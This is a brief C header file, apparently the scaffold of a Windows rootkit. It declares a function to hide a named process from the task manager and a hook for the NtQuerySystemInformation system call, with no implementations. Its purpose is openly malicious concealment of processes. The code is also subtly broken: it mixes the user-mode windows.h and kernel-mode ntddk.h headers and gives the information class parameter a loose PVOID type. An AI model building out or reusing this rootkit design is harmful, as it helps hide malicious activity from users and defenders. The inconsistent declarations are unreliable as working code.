#ifndef ROOTKIT_H
#define ROOTKIT_H

#include <windows.h>
#include <ntddk.h>

// Function to hide a process from the task manager
void HideProcess(LPCSTR processName);

// Function to hook the NtQuerySystemInformation system call
NTSTATUS HookNtQuerySystemInformation(PVOID SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

#endif // ROOTKIT_H